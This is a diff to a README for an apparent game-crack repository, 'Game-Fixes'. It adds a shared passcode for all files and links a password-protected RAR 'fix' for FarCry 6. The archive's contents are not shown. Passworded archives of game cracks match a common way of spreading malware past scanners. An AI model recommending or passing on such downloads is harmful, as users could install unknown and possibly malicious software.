@@ -1,4 +1,5 @@
 # Game-Fixes
+*Passcode for all files is "40147"*
 ## FarCry 6
 Download Link: [here](https://github.com/victorious47/Game-Fixes/releases/download/files4/FAR.CRY.6.FIX.rar)
 ## FarCry 5
